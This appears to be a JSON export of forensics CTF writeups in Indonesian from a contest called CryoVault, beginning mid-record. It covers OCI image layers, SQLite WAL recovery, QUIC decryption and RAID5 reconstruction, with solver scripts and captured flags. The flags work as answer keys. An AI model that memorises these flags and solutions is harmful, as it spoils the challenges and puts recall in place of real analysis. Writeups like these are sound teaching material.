        "code": "mf-326c47df321e  capture\n  > mf-95efb978da36  crop\n  > mf-57d2452e846e  resize\n  > mf-ee2392778137  redact"
      },
      {
        "title": "Checkpoint",
        "content": "Root dihitung sebagai Merkle tree RFC6962-style:\n\n\n\nRoot yang cocok dengan `case.json` berada pada tree size 33, 46, 52, dan 55. Checkpoint yang digunakan untuk kandidat derivative adalah tree size `46`; tree size 55 bukan checkpoint yang dipakai oleh bukti signature yang valid.",
        "code": "leaf = sha256(b\"\\x00\" + record_body)\nnode = sha256(b\"\\x01\" + left + right)"
      },
      {
        "title": "Dekripsi flag",
        "content": "Evidence yang dimasukkan ke KDF:\n\n\n\nDengan `hashlib.scrypt` dan AES-GCM sesuai instruksi challenge, plaintext yang terautentikasi adalah:",
        "code": "[\n  \"c40ac4a3268f0b30aac5a1e344e1e4016b82fbfb1171e86330a64c69e73d6cff\",\n  \"mf-ee2392778137\",\n  \"mf-326c47df321e>mf-95efb978da36>mf-57d2452e846e>mf-ee2392778137\",\n  \"5fe33137c48b34086ca6c2c19723b4916fb13732e465759be10b96dcef825bcf\",\n  \"incident-d7be9442cb\",\n  \"46\"\n]"
      }
    ],
    "terminalOutputs": [],
    "flag": "isfcr{29336738f5f44f4d2d1e3ac2}",
    "lessonsLearned": ""
  },
  {
    "id": "cryovault-foren-theimagethatforgot",
    "title": "The Image That Forgot — Forensics",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "**Flag:** `isfcr{57cfd556fca281af64d920ef}`",
    "problemDescription": "**Flag:** `isfcr{57cfd556fca281af64d920ef}`\n\nTarget-nya adalah incident token milik instance `dispatch-ac1af5608a` yang sedang melayani request pada `2026-08-14T10:10:08.555+05:30`. File yang diberikan berupa `handout(5).zip`.",
    "tools": [],
    "analysis": "```bash\nunzip 'handout(5).zip'\ncd the-image-that-forgot\nfile *\ntar -tf images.tar | head\n```\n\nIsi ZIP tidak menyimpan flag secara langsung:\n\n- `events.jsonl`: event deployment, restart, rollback, migration, dan perpindahan tag.\n- `images.tar`: OCI image layout, berisi index, manifest multi-platform, config, dan layer tar.\n- `vault.json`: empat key AES-256 dan 203 note terenkripsi (`nonce` + ciphertext/tag).\n\nExtract OCI layout agar blob bisa dibaca berdasarkan SHA-256:\n\n```bash\ntar -xf images.tar\ncat index.json\n```",
    "solution": [
      {
        "title": "Timeline yang ternyata menentukan",
        "content": "Timestamp event menggunakan timezone campuran, sementara perpindahan tag disimpan sebagai epoch milidetik (`time_ms`). Urutkan semuanya dalam UTC, bukan urutan baris JSONL.\n\nWaktu target: **04:40:08.555 UTC**.\n\n| UTC | Event | Efek |\n|---|---|---|\n| 03:56:28.858 | `dispatch:stable` → `sha256:30062144...` | Tag dipindah |\n| 03:56:28.933 | `deploy-96e8ea44e4` | Deployment sukses memakai digest tersebut |\n| 04:16:07.622 | `dispatch:stable` → `sha256:6dae20c6...` | Tag berubah lagi |\n| 04:16:07.672 | `deploy-6d1373b389` | Deployment baru sukses |\n| 04:25:54.376 | `deploy-81aa644580` | **Rollback** ke deployment sukses sebelumnya (`30062144...`) |\n| 04:31:26.759 | `dispatch:stable` → `sha256:1e6f1acb...` | Tidak otomatis mengganti image instance berjalan |\n| 04:36:41.756 | `deploy-9d1a1fd93d` | **Migrate** ke `linux/amd64`; instance baru dimulai |\n| 04:38:01.936 | `deploy-ac1c2df5f4` | Aktivasi **failed**, tidak mengganti instance |\n| 04:40:08.555 | **Target** | Image hasil rollback, instance hasil migration |\n| 04:41:54.053 | `deploy-3c62515105` | Restart, **sesudah** waktu target |\n\nKesalahan yang mudah terjadi di sini: memakai nilai terbaru `dispatch:stable` pada waktu target. Instance tidak mengikuti tag yang bergeser setelah image di-pull. Kita butuh digest dari deployment yang masih aktif.\n\nImage index yang relevan:",
        "code": "sha256:30062144e4a7cfc95730fe76cfe8d3a9ccb20434dfee8d8c55c8e7349227981a"
      },
      {
        "title": "OCI manifest dan key yang sempat hilang",
        "content": "Index tersebut bukan manifest yang dipakai langsung oleh container. OCI index menunjuk manifest berbeda untuk `amd64`, `arm64/v8`, dan `arm/v7`.\n\nUntuk node tujuan migration (`linux/amd64`) didapat:\n\n\n\nManifest ini punya lima layer. Pemeriksaan isi masing-masing layer menunjukkan:\n\n- Layer 0: `etc/service/key-version.json` → `key-3de4b6b00b`.\n- Layer 1: path yang sama ditulis ulang sebagai **hardlink** ke `opt/dispatch/.state/b97e8564`. Isi target hardlink adalah `key-e52be7cc57` untuk service yang dicari.\n- Layer 3: `etc/service/.wh..wh..opq` (OCI opaque whiteout), yang menyembunyikan file lama di direktori itu pada filesystem akhir.\n- Layer 4: `etc/service.bak/key-version.json` → `key-90a623d0c2`, kandidat backup yang tidak sama dengan versi pada hardlink terakhir.\n\nJadi untuk recovery forensik, cukup membaca assignment terakhir ke path konfigurasi canonical **sebelum whiteout**; bytes-nya masih tersimpan di `.state`. Jangan asal memilih versi paling bawah ataupun versi di file `.bak`. Verifikasi autentikasi flag akhirnya membedakan kandidat-kandidat tersebut.\n\nKey-version yang berhasil diverifikasi: **`key-e52be7cc57`**.",
        "code": "sha256:154d6f1fa75464d02b6245a4e536f6efb187af4bf7266aff8ac9e2e21d4538f8"
      },
      {
        "title": "Dekripsi vault",
        "content": "Associated data (AAD) wajib berupa JSON ASCII ringkas dan berurutan:\n\n\n\nNote **index 92** berhasil terautentikasi. Token plaintext:\n\n\n\nPerlu dibedakan: note yang berhasil didekripsi belum membuktikan bahwa itu token instance target, karena vault juga berisi sejumlah kombinasi yang sengaja dapat didekripsi. Validasi terakhir adalah AES-GCM flag yang kuncinya diturunkan lewat scrypt atas evidence lengkap.\n\n\n\nOutput:",
        "code": "import json\nfrom cryptography.hazmat.primitives.ciphers.aead import AESGCM\nfrom cryptography.exceptions import InvalidTag\n\nevent_id = 'deploy-9d1a1fd93d'\nmanifest_digest = 'sha256:154d6f1fa75464d02b6245a4e536f6efb187af4bf7266aff8ac9e2e21d4538f8'\nservice_id = 'dispatch-ac1af5608a'\nkey_version = 'key-e52be7cc57'\n\naad = json.dumps(\n    [service_id, key_version, manifest_digest, event_id],\n    ensure_ascii=True, separators=(',', ':')\n).encode('ascii')\n\nvault = json.load(open('vault.json'))\nfor i, note in enumerate(vault['notes']):\n    for key in vault['keys']:\n        try:\n            token = AESGCM(bytes.fromhex(key)).decrypt(\n                bytes.fromhex(note['nonce']),\n                bytes.fromhex(note['data']),\n                aad\n            ).decode('ascii')\n            print(i, token)\n        except (InvalidTag, ValueError):\n            pass"
      },
      {
        "title": "Reproduce",
        "content": "`solve.py` sudah menyatukan parsing timeline, pemilihan platform manifest, pembacaan OCI layers, pencarian note, dan dekripsi flag. Semua artefak tetap lokal.\n\n\n\nExpected akhir:\n\n\n\n**Final evidence:**",
        "code": "source /home/nata/ctf_env/bin/activate\n# kalau belum diextract: tar -xf images.tar\npython3 solve.py"
      },
      {
        "title": "Solver Script",
        "content": "The complete solver script (`solve.py`) is included below.",
        "code": "#!/usr/bin/env python3\n\"\"\"Reconstruct the running OCI image and authenticate its incident token.\n\nRun from the extracted challenge directory: python3 solve.py\nDependency: cryptography (pip install cryptography)\n\"\"\"\nimport datetime as dt\nimport hashlib\nimport io\nimport json\nimport tarfile\nfrom pathlib import Path\n\nfrom cryptography.hazmat.primitives.ciphers.aead import AESGCM\nfrom cryptography.exceptions import InvalidTag\n\nROOT = Path(__file__).resolve().parent\nSERVICE = \"dispatch-ac1af5608a\"\nAT = dt.datetime.fromisoformat(\"2026-08-14T10:10:08.555+05:30\").astimezone(dt.timezone.utc)\nNOTE_SERVICE_KEY = \"etc/service/key-version.json\"\n\n\ndef compact(values):\n    return json.dumps(values, ensure_ascii=True, separators=(\",\", \":\")).encode(\"ascii\")\n\n\ndef blob(digest):\n    if not digest.startswith(\"sha256:\"):\n        raise ValueError(\"Expected sha256: digest\")\n    data = (ROOT / \"blobs\" / \"sha256\" / digest[7:]).read_bytes()\n    if hashlib.sha256(data).hexdigest() != digest[7:]:\n        raise ValueError(f\"Corrupted OCI blob: {digest}\")\n    return data\n\n\ndef utc_time(obj):\n    if \"time_ms\" in obj:\n        return dt.datetime.fromtimestamp(obj[\"time_ms\"] / 1000, tz=dt.timezone.utc)\n    return dt.datetime.fromisoformat(obj[\"time\"].replace(\"Z\", \"+00:00\")).astimezone(dt.timezone.utc)\n\n\ndef active_instance():\n    records = [json.loads(x) for x in (ROOT / \"events.jsonl\").read_text().splitlines()]\n    events = sorted(enumerate(records), key=lambda p: (utc_time(p[1]), p[0]))\n    tags = {}\n    stack = []\n    history = []\n    for _, e in events:\n        when = utc_time(e)\n        if when > AT:\n            break\n        if \"tag\" in e:\n            tags[e[\"tag\"]] = e[\"digest\"]\n            continue\n        if e.get(\"service_id\") != SERVICE or e.get(\"status\") == \"failed\":\n            continue\n        action = e[\"action\"]\n        if action == \"activate\":\n            ref = e[\"ref\"]\n            index_digest = ref if ref.startswith(\"sha256:\") else tags[ref]\n            state = {\n                \"event_id\": e[\"event_id\"],\n                \"index_digest\": index_digest,\n                \"platform\": e.get(\"platform\", stack[-1][\"platform\"] if stack else None),\n            }\n            stack.append(state)\n            history.append((when, action, state.copy()))\n        elif action == \"rollback\":\n            if len(stack) < 2:\n                raise ValueError(\"Rollback with no previous successful deployment\")\n            stack.pop()\n            stack[-1][\"event_id\"] = e[\"event_id\"]\n            history.append((when, action, stack[-1].copy()))\n        elif action in (\"restart\", \"migrate\"):\n            if not stack:\n                raise ValueError(f\"No image for {action}\")\n            stack[-1] = {**stack[-1], \"event_id\": e[\"event_id\"],\n                         \"platform\": e.get(\"platform\", stack[-1][\"platform\"])}\n            history.append((when, action, stack[-1].copy()))\n    if not stack or not stack[-1][\"platform\"]:\n        raise ValueError(\"No running instance/platform resolved\")\n    return stack[-1], history\n\n\ndef select_manifest(image_index, platform):\n    index = json.loads(blob(image_index))\n    target = platform.split(\"/\")  # linux/amd64 or linux/arm64/v8\n    for obj in index[\"manifests\"]:\n        p = obj[\"platform\"]\n        if [p[\"os\"], p[\"architecture\"]] + ([p[\"variant\"]] if \"variant\" in p else []) == target:\n            return obj[\"digest\"], json.loads(blob(obj[\"digest\"]))\n    raise ValueError(f\"Platform {platform} absent from image index\")\n\n\ndef recover_key_version(manifest):\n    \"\"\"Inspect original layers, even files masked by later OCI whiteouts.\n\n    The last assignment to etc/service/key-version.json is a hardlink to\n    opt/dispatch/.state/b97e8564. The following opaque whiteout removes\n    the live /etc/service entry but not the forensic bytes in .state.\n    \"\"\"\n    files = {}\n    declarations = []\n    obscured = False\n    for i, layer in enumerate(manifest[\"layers\"]):\n        with tarfile.open(fileobj=io.BytesIO(blob(layer[\"digest\"])), mode=\"r:*\") as tar:\n            for member in tar:\n                name = member.name.removeprefix(\"./\").rstrip(\"/\")\n                if name == \"etc/service/.wh..wh..opq\":\n                    obscured = True\n                    files.pop(NOTE_SERVICE_KEY, None)\n                elif name == \"etc/service/.wh.key-version.json\":\n                    files.pop(NOTE_SERVICE_KEY, None)\n                elif member.isfile():\n                    files[name] = tar.extractfile(member).read()\n                    if name == NOTE_SERVICE_KEY:\n                        declarations.append((i, files[name], name))\n                elif member.islnk():  # tar hard link, not a symlink\n                    dest = member.linkname.removeprefix(\"./\")\n                    if dest not in files:\n                        raise ValueError(f\"Missing hardlink target {dest}\")\n                    files[name] = files[dest]\n                    if name == NOTE_SERVICE_KEY:\n                        declarations.append((i, files[name], f\"{name} -> {dest}\"))\n    if not declarations:\n        raise ValueError(\"No recoverable key-version declaration\")\n    idx, raw, source = declarations[-1]\n    record = json.loads(raw)\n    if record.get(\"service_id\") != SERVICE:\n        raise ValueError(\"Wrong key-version service\")\n    return record[\"key_version\"], source, obscured\n\n\ndef incident_token(event_id, manifest_digest, key_version):\n    vault = json.loads((ROOT / \"vault.json\").read_text())\n    aad = compact([SERVICE, key_version, manifest_digest, event_id])\n    matches = []\n    for i, note in enumerate(vault[\"notes\"]):\n        nonce = bytes.fromhex(note[\"nonce\"])\n        ciphertext_and_tag = bytes.fromhex(note[\"data\"])\n        for key_hex in vault[\"keys\"]:\n            try:\n                token = AESGCM(bytes.fromhex(key_hex)).decrypt(nonce, ciphertext_and_tag, aad).decode(\"ascii\")\n            except (InvalidTag, ValueError, UnicodeDecodeError):\n                continue\n            matches.append((i, token))\n    if len(matches) != 1:\n        raise ValueError(f\"Expected exactly one authenticated note, got {len(matches)}\")\n    return matches[0]\n\n\ndef main():\n    active, history = active_instance()\n    print(\"Target UTC:\", AT.isoformat())\n    for when, action, obj in history:\n        print(when.strftime(\"%H:%M:%S.%f\")[:-3], action, obj[\"event_id\"], obj[\"index_digest\"][:22], obj[\"platform\"])\n    event_id, image_index = active[\"event_id\"], active[\"index_digest\"]\n    manifest_digest, manifest = select_manifest(image_index, active[\"platform\"])\n    key_version, key_source, whiteout = recover_key_version(manifest)\n    print(\"Image index:\", image_index)\n    print(\"Platform-specific manifest:\", manifest_digest)\n    print(\"Recovered key-version:\", key_version, \"from\", key_source)\n    print(\"Opaque whiteout encountered:\", whiteout)\n    note_idx, token = incident_token(event_id, manifest_digest, key_version)\n    print(\"Authenticated vault note:\", note_idx, \"token:\", token)\n\n    evidence = [event_id, manifest_digest, SERVICE, key_version, token]\n    encoded = compact(evidence)\n    aes_key = hashlib.scrypt(\n        b\"isfcr-forensics\\x00\" + encoded,\n        salt=bytes.fromhex(\"8b57a161139a064a196625972f7e602d\"),\n        n=131072, r=8, p=1, maxmem=2**28, dklen=32,\n    )\n    flag = AESGCM(aes_key).decrypt(\n        bytes.fromhex(\"244cb048e982870d71f68dfe\"),\n        bytes.fromhex(\"02e462042292a430220d3959e46c379b7f96d44726c6c390338ed11b7ee9878875de07ad212f4dbbda1994c3e2574c\"),\n        b\"the-image-that-forgot\",\n    ).decode(\"ascii\")\n    if not flag.startswith(\"isfcr{\") or not flag.endswith(\"}\"):\n        raise ValueError(\"Unexpected decrypted flag format\")\n    print(\"Evidence:\", json.dumps(evidence, indent=2))\n    print(f\"<FLAG>{flag}</FLAG>\")\n\n\nif __name__ == \"__main__\":\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "isfcr{57cfd556fca281af64d920ef}",
    "lessonsLearned": ""
  },
  {
    "id": "cryovault-foren-thelastcommittedmessage",
    "title": "The Last Committed Message",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "Writeup for challenge The Last Committed Message",
    "problemDescription": "",
    "tools": [],
    "analysis": "`handout.zip` berisi dua artefak SQLite:\n\n```text\nthe-last-committed-message/case.db\nthe-last-committed-message/case.db-wal\n```\n\nSchema-nya hanya memiliki `notes`, `attachments`, dan `operations`. Database utama berisi state setelah beberapa operasi berikutnya, jadi query langsung tidak menemukan `op-09e0d79b4b14`.",
    "solution": [
      {
        "title": "Recovery WAL",
        "content": "WAL memakai page size 512 byte dan berisi banyak commit historis. ID target tersimpan sebagai UTF-16LE di page WAL. Commit yang memuat `op-09e0d79b4b14` berakhir pada frame 455; frame tersebut juga memiliki database-size marker `208`.\n\nSaya membuat snapshot dengan mengambil page terakhir dari `case.db` atau WAL sampai frame 455. Snapshot SQLite tersebut memang dianggap malformed oleh parser normal karena merupakan rekonstruksi manual, tetapi `.recover` masih bisa mengambil row penting:\n\n\n\nHasil target:\n\n\n\nDestination historis yang ditemukan adalah:",
        "code": "sqlite3 snapshot-455.db '.recover' | rg \\\n  'blob-72346f69c681|op-09e0d79b4b14|note-7211098c21a6'"
      },
      {
        "title": "Flag derivation",
        "content": "`solve_flag.py` mengambil row hasil `.recover`, membangun evidence dalam urutan yang diberikan challenge, lalu menjalankan scrypt dan AES-GCM. Eksekusi menghasilkan:\n\n\n\nScript rekonstruksi WAL ada di `reconstruct_wal.py`, sedangkan derivasi dan verifikasi flag ada di `solve_flag.py`.",
        "code": "isfcr{a03a410f1b87dbc115dd1ef6}"
      },
      {
        "title": "Solver Script",
        "content": "The complete solver script (`solve_flag.py`) is included below.",
        "code": "import ast\nimport hashlib\nimport json\nimport re\nimport sqlite3\nimport subprocess\nfrom cryptography.hazmat.primitives.ciphers.aead import AESGCM\n\ndump = subprocess.check_output(\n    [\"sqlite3\", \"snapshot-455.db\", \".recover\"], stderr=subprocess.DEVNULL,\n    text=True,\n)\n\natt = next(\n    (re.search(r\"VALUES \\((.*?)\\);\", line)\n     for line in dump.splitlines()\n     if \"INSERT OR IGNORE INTO 'attachments'\" in line\n     and \"blob-72346f69c681\" in line),\n    None,\n)\nnote = next(\n    (re.search(r\"VALUES \\((.*?)\\);\", line)\n     for line in dump.splitlines()\n     if \"INSERT OR IGNORE INTO 'notes'\" in line\n     and \"note-7211098c21a6\" in line),\n    None,\n)\nif not att or not note:\n    raise SystemExit(\"target rows not found\")\n\natt_values = ast.literal_eval(\"(\" + att.group(1) + \")\")\nnote_values = ast.literal_eval(\"(\" + note.group(1) + \")\")\nsha = att_values[1]\nnote_id, revision, destination, attachment_id, operation_id = note_values\nassert operation_id == \"op-09e0d79b4b14\"\nassert attachment_id == att_values[0]\n\nevidence = [note_id, str(revision), destination, sha]\nencoded = json.dumps(evidence, ensure_ascii=True, separators=(\",\", \":\")).encode(\"ascii\")\nkey = hashlib.scrypt(\n    b\"isfcr-forensics\\x00\" + encoded,\n    salt=bytes.fromhex(\"a3845b1a904c5ee73abe7329b5d735d7\"),\n    n=131072, r=8, p=1, maxmem=2**28, dklen=32,\n)\nflag = AESGCM(key).decrypt(\n    bytes.fromhex(\"ca98cff993b27fd3bb352436\"),\n    bytes.fromhex(\"3fa8b9049b01fb8d12df130b404352f9c678c272cccb7e6c034554c902f1ca4d574fc04db8892fead1ad394735e021\"),\n    b\"the-last-committed-message\",\n).decode()\nprint(json.dumps(evidence, ensure_ascii=True, separators=(\",\", \":\")))\nprint(flag)"
      }
    ],
    "terminalOutputs": [],
    "flag": "isfcr{a03a410f1b87dbc115dd1ef6}",
    "lessonsLearned": ""
  },
  {
    "id": "cryovault-foren-thethirdkeyphase",
    "title": "The Third Key Phase — forensic notes (belum solved)",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "Arsip `handout(6).zip` hanya memuat `the-third-key-phase/capture.pcapng` (265 UDP datagrams). Capture memiliki PCAPNG Decryption Secrets Block (`TLSK`) berisi lima pasang `CLIENT_TRAFFIC_SECRET_0` dan `SERVER_TRAFFIC_SECRET_0`, serta Section Header Block option yang menyimpan anchor packet number untuk masing-masing `client_random`.",
    "problemDescription": "Arsip `handout(6).zip` hanya memuat `the-third-key-phase/capture.pcapng` (265 UDP datagrams). Capture memiliki PCAPNG Decryption Secrets Block (`TLSK`) berisi lima pasang `CLIENT_TRAFFIC_SECRET_0` dan `SERVER_TRAFFIC_SECRET_0`, serta Section Header Block option yang menyimpan anchor packet number untuk masing-masing `client_random`.\n\nAnalisis awal sempat gagal mendekripsi flow `203.0.113.37:37187` karena QUIC 1-RTT memperbarui AEAD key dan IV melalui key update, **tetapi header-protection key tidak ikut dirotasi**. Di flow sebelumnya, `192.0.2.10:57949`, frame `NEW_CONNECTION_ID` menunjuk CID sepanjang 12 byte `4231d0af7c6879e970ec5174` dan CID 5 byte `07cae0fa5b` yang muncul setelah migrasi. Secret awal koneksi tersebut menggunakan `client_random`:\n\n`87566bdc267eee5e8a8a7d0251033ec0ce2aef613ef35623cf1e6dc5fc1310d3`\n\nFlow migrasi didekripsi memakai ChaCha20-Poly1305, QUIC v2 HKDF labels (`quicv2 key`, `quicv2 iv`, `quicv2 hp`, `quicv2 ku`), serta application secret generations 1, 2, dan 3. Ada flow berbeda `192.0.2.10:58379` yang menyebut **request id yang sama** tetapi memiliki upload tidak lengkap (`parts=[0,4,8]`, `unit=90`), jadi request id saja tidak cukup untuk mengidentifikasi file.\n\nStream metadata untuk koneksi yang bermigrasi:\n\n```json\n{\"request_id\":\"6e26102a48d71fe1d7f68231\",\"parts\":[0,4,8,12],\"unit\":119}\n{\"request_id\":\"6e26102a48d71fe1d7f68231\",\"replace\":{\"4\":20}}\n{\"request_id\":\"6e26102a48d71fe1d7f68231\",\"replace\":{\"8\":16}}\n{\"request_id\":\"6e26102a48d71fe1d7f68231\",\"replace\":{\"8\":24}}\n```\n\nStatus dari server: stream `0`, `12`, `16`, `20` -> `217`; stream `8`, `24` -> `26`. Empat stream yang berstatus `217` lengkap dan tanpa konflik dalam reassembly. Panjangnya berturut-turut 2530, 2499, 2499, dan 2499 byte (semuanya sesuai blok 119 byte plus remainder).\n\nNamun hipotesis penggabungan blok 119 byte secara bergiliran `[stream 0, stream 20, stream 16, stream 12]` menghasilkan 10027 byte dengan SHA-256:\n\n`0d18c22c18a8...` (nilai lengkap diperoleh saat menjalankan `solve.py`).\n\n**Hash tersebut tidak membuka seal:** `AESGCM.decrypt` mengembalikan `InvalidTag`. Telah diuji pula konkatenasi, semua permutasi urutan stream, beberapa pemilihan versi pengganti, serta penggabungan blok dan stream tunggal. Belum ada evidence hash yang tervalidasi oleh autentikasi AES-GCM. Jangan submit flag atau menganggap file kandidat ini final.\n\nUntuk reproduksi dari folder ini:\n\n```bash\npython3 solve.py\n```\n\nDependensi: `cryptography`; modul `recon.py`, `quic.py`, `decode.py`, dan `reassemble.py` berada di folder sama. File kandidat hasil ekstraksi ditulis ke `reconstructed_candidate.bin`. Semua file dibuat di folder challenge.",
    "tools": [],
    "analysis": "Arsip `handout(6).zip` hanya memuat `the-third-key-phase/capture.pcapng` (265 UDP datagrams). Capture memiliki PCAPNG Decryption Secrets Block (`TLSK`) berisi lima pasang `CLIENT_TRAFFIC_SECRET_0` dan `SERVER_TRAFFIC_SECRET_0`, serta Section Header Block option yang menyimpan anchor packet number untuk masing-masing `client_random`.\n\nAnalisis awal sempat gagal mendekripsi flow `203.0.113.37:37187` karena QUIC 1-RTT memperbarui AEAD key dan IV melalui key update, **tetapi header-protection key tidak ikut dirotasi**. Di flow sebelumnya, `192.0.2.10:57949`, frame `NEW_CONNECTION_ID` menunjuk CID sepanjang 12 byte `4231d0af7c6879e970ec5174` dan CID 5 byte `07cae0fa5b` yang muncul setelah migrasi. Secret awal koneksi tersebut menggunakan `client_random`:\n\n`87566bdc267eee5e8a8a7d0251033ec0ce2aef613ef35623cf1e6dc5fc1310d3`\n\nFlow migrasi didekripsi memakai ChaCha20-Poly1305, QUIC v2 HKDF labels (`quicv2 key`, `quicv2 iv`, `quicv2 hp`, `quicv2 ku`), serta application secret generations 1, 2, dan 3. Ada flow berbeda `192.0.2.10:58379` yang menyebut **request id yang sama** tetapi memiliki upload tidak lengkap (`parts=[0,4,8]`, `unit=90`), jadi request id saja tidak cukup untuk mengidentifikasi file.\n\nStream metadata untuk koneksi yang bermigrasi:\n\n```json\n{\"request_id\":\"6e26102a48d71fe1d7f68231\",\"parts\":[0,4,8,12],\"unit\":119}\n{\"request_id\":\"6e26102a48d71fe1d7f68231\",\"replace\":{\"4\":20}}\n{\"request_id\":\"6e26102a48d71fe1d7f68231\",\"replace\":{\"8\":16}}\n{\"request_id\":\"6e26102a48d71fe1d7f68231\",\"replace\":{\"8\":24}}\n```\n\nStatus dari server: stream `0`, `12`, `16`, `20` -> `217`; stream `8`, `24` -> `26`. Empat stream yang berstatus `217` lengkap dan tanpa konflik dalam reassembly. Panjangnya berturut-turut 2530, 2499, 2499, dan 2499 byte (semuanya sesuai blok 119 byte plus remainder).\n\nNamun hipotesis penggabungan blok 119 byte secara bergiliran `[stream 0, stream 20, stream 16, stream 12]` menghasilkan 10027 byte dengan SHA-256:\n\n`0d18c22c18a8...` (nilai lengkap diperoleh saat menjalankan `solve.py`).\n\n**Hash tersebut tidak membuka seal:** `AESGCM.decrypt` mengembalikan `InvalidTag`. Telah diuji pula konkatenasi, semua permutasi urutan stream, beberapa pemilihan versi pengganti, serta penggabungan blok dan stream tunggal. Belum ada evidence hash yang tervalidasi oleh autentikasi AES-GCM. Jangan submit flag atau menganggap file kandidat ini final.\n\nUntuk reproduksi dari folder ini:\n\n```bash\npython3 solve.py\n```\n\nDependensi: `cryptography`; modul `recon.py`, `quic.py`, `decode.py`, dan `reassemble.py` berada di folder sama. File kandidat hasil ekstraksi ditulis ke `reconstructed_candidate.bin`. Semua file dibuat di folder challenge.",
    "solution": [
      {
        "title": "Tambahan pengujian",
        "content": "`variant_check.py` menguji enam kombinasi penggunaan shard asli dan pengganti (`4/20` serta `8/16/24`). Semuanya gagal autentikasi AES-GCM.\n\n`pattern_check.py` menguji 64 pola penataan ulang shard dengan rotasi per putaran dan pembalikan baris. Semuanya gagal autentikasi.\n\nBelum ada file dengan SHA-256 dan client_random yang tervalidasi oleh seal. Karena itu flag belum boleh diklaim. Untuk reproduksi, jalankan `python3 solve.py` dari folder ini (memerlukan `cryptography`)."
      },
      {
        "title": "Solver Script",
        "content": "The complete solver script (`solve.py`) is included below.",
        "code": "#!/usr/bin/env python3\n\"\"\"Reproducible QUIC v2 key phase / migration reconstruction of the candidate upload.\nNot yet a confirmed solution: the seal authenticator currently fails on the\nobvious accepted-shard striping. No flag is printed unless AEAD passes.\n\"\"\"\nfrom collections import defaultdict\nimport json,hashlib\nfrom pathlib import Path\nfrom cryptography.hazmat.primitives.ciphers.aead import AESGCM\nfrom cryptography.exceptions import InvalidTag\nfrom decode import get_decrypted, flows\nfrom reassemble import reassemble\n\nREQUEST='6e26102a48d71fe1d7f68231'\nROOT=Path(__file__).resolve().parent\nCLIENT_RANDOM='87566bdc267eee5e8a8a7d0251033ec0ce2aef613ef35623cf1e6dc5fc1310d3'\nSALT=bytes.fromhex('55cfbdc7a31326404d59e133d991dc88')\nNONCE=bytes.fromhex('f684f2db484cdd8e6f38b16e')\nSEALED=bytes.fromhex('c4805539a3db8bc0bba5f5fb6ad76c1125d889aab86af18041007f8f49e30d2b5822be5cf8d26d21ddb576b25d06bc')\n\ndef assemble_interleave(shards, unit):\n    return b''.join(shard[start:start+unit]\n                    for start in range(0,max(map(len,shards)),unit)\n                    for shard in shards)\n\ndef main():\n    decrypted=get_decrypted()\n    migrated=('203.0.113.37',37187)\n    initial=('192.0.2.10',57949)\n    parts=defaultdict(list)\n    for result in decrypted[migrated]+decrypted[initial]:\n        for frame in result['frames']:\n            if frame[0]=='STREAM':parts[(result['dir'],frame[1])].append(frame)\n    for sid in (0,2,6,8,10,12,14,16,20,24):\n        data,gaps,conflicts,fins=reassemble(parts[('CLIENT',sid)])\n        assert not gaps and not conflicts, (sid,gaps,conflicts)\n        print('stream',sid,'size',len(data),'fin',bool(fins))\n        if sid in (2,6,10,14):print(' metadata:',data.decode())\n    for sid in (0,8,12,16,20,24):\n        value,gaps,conflicts,fins=reassemble(parts[('SERVER',sid)])\n        print('server_status',sid,value.decode() if value else '<none>')\n    shards=[reassemble(parts[('CLIENT',sid)])[0] for sid in (0,20,16,12)]\n    data=assemble_interleave(shards,119)\n    sha=hashlib.sha256(data).hexdigest()\n    candidate=ROOT/'reconstructed_candidate.bin'\n    candidate.write_bytes(data)\n    print('candidate file',candidate,'size',len(data),'sha256',sha)\n    evidence=[REQUEST,CLIENT_RANDOM,sha]\n    E=json.dumps(evidence,ensure_ascii=True,separators=(',',':')).encode('ascii')\n    key=hashlib.scrypt(b'isfcr-forensics\\x00'+E,salt=SALT,n=131072,r=8,p=1,maxmem=2**28,dklen=32)\n    try:\n        plaintext=AESGCM(key).decrypt(NONCE,SEALED,b'the-third-key-phase')\n    except InvalidTag:\n        print('NOT VERIFIED: AES-GCM tag did not authenticate, no flag can be claimed')\n        return 1\n    flag=plaintext.decode('ascii')\n    assert flag.startswith('isfcr{') and flag.endswith('}')\n    print(f'<FLAG>{flag}</FLAG>')\n    return 0\n\nif __name__=='__main__':raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": ""
  },
  {
    "id": "cryovault-foren-writehole",
    "title": "Write Hole",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "Writeup for challenge Write Hole",
    "problemDescription": "",
    "tools": [],
    "analysis": "Ketiga file berukuran 17 MiB dan tidak punya signature filesystem di offset nol. `binwalk` menemukan filesystem ext4 mulai `0x100000`, sementara `strings` menemukan petunjuk lokal seperti `/dev/md0`, `raid5, 3 members (bays 0-2)`, serta script staging.\n\n```bash\nfile bay*.img\nbinwalk bay*.img\nstrings -a -n 10 bay*.img | grep -Ei 'raid5|payload|intent|KSLT|custody'\n```\n\nRelasi XOR antar bay pada blok 32 KiB mulai offset 1 MiB konsisten dengan RAID5. Jadi bagian awal tiap image adalah metadata, lalu array dimulai di `0x100000` dengan chunk 32 KiB.",
    "solution": [
      {
        "title": "Keyslot dan intent",
        "content": "Signature `KSLT` job 7 muncul pada bay 1 dan bay 2. Salinannya valid terhadap CRC dan memberikan AES key. File intent yang ikut tersimpan berisi enam SHA-256 record payload:\n\n\n\nRecord yang berada di satu bay atau dapat direkonstruksi dari XOR dua bay dicocokkan dengan hash intent. Lima record lolos verifikasi; record yang memuat shard pertama terkena write-hole. Pada stripe tersebut, `bay0 XOR bay1` masih mengandung nonce dan sebagian besar ciphertext job 7. Tag GCM memang rusak, jadi ciphertext didekripsi memakai counter AES-GCM secara langsung untuk mengambil plaintext yang masih utuh.",
